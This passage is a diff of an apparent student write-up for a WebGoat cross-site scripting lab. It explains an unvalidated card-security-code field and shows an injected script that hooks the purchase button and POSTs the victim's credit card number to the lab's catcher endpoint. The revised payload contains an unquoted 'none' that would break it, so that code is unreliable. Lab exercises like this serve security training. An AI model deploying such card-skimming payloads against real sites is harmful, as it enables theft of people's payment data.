@@ -9,7 +9,16 @@ When they enter their information and hit the submit button the myFunction scrip
 This script gets the input from the form and then uses that to make a POST request to the url with the user's information as a query. 
 
 Part 2 Explanation:
-http://localhost:8090/WebGoat/start.mvc?#attack/1731484628/900?input1=bruh&input2=<script> document.form.buy.onclick = function (){var number = document.form.input1.value;var bruv = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=" + number;console.log(bruv);fetch(bruv, {method: "POST"});}; document.form.input2.value = "000"</script>
+http://localhost:8090/WebGoat/start.mvc?#attack/1731484628/900?input1=bruh&input2=
+<script> 
+	document.form.buy.onclick = function () {
+		var number = document.form.input1.value;
+		var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=" + number;
+		document.getElementById("message").style.display = none;
+		fetch(url, {method: "POST"});
+	}; 
+	document.form.input2.value = "000"
+</script>
 
 The field that is exploitable is the field with the name input2, that is asking for the 3 digits of the back of the user's credit card, that doesn't validate it's input.
 The injected code sets a function that runs when the user clicks on the submit button to submit their credit card info, using the onclick property of the button. 
